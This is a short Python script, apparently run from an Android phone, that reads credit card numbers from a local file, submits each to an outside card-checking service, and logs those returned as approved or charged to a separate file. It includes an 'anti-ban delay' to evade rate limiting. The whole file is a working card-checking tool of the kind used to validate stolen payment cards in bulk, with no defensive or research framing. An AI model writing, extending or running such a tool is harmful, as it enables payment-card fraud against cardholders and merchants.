import requests
import time
import os
from datetime import datetime

# 💾 File Paths
input_file = '/storage/emulated/0/cc.txt'
approved_file = '/storage/emulated/0/✅_approved_cards.txt'

# 🌐 Headers
headers = {
    'authority': 'b3charger.net',
    'accept': '*/*',
    'content-type': 'application/json',
    'origin': 'https://b3charger.net',
    'referer': 'https://b3charger.net/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10...)',
}

# 🔍 Function to check card
def check_card(card):
    try:
        response = requests.post(
            'https://b3charger.net/check_card',
            headers=headers,
            json={'card': card},
            timeout=15
        )
        return response.json().get("status", "No status returned")
    except Exception as e:
        return f"error::{e}"  # mark it as error for detection

# 🚀 Main runner
if not os.path.exists(input_file):
    print("❌ File not found:", input_file)
    exit()

print("\n📤 Starting card checker...\n")

with open(input_file, 'r') as file:
    count = 0
    for line in file:
        card = line.strip()
        if not card:
            continue

        count += 1
        print(f"🔁 [{count}] Checking ➤ {card}")

        result = check_card(card)
        time_now = datetime.now().strftime("%H:%M:%S")

        if result.startswith("error::"):
            print("⚠️ Error:", result[7:])
        elif any(x in result.lower() for x in ["approved", "charged", "success"]):
            print(f"🟢 APPROVED: {result}")
            with open(approved_file, 'a', encoding='utf-8') as f:
                f.write(f"✅ {card} → {result} [at {time_now}]\n")
        else:
            print(f"🔴 Declined: {result}")

        time.sleep(1.2)  # anti-ban delay

print("\n✅ Done! Approved cards saved to:")
print("📁", approved_file)
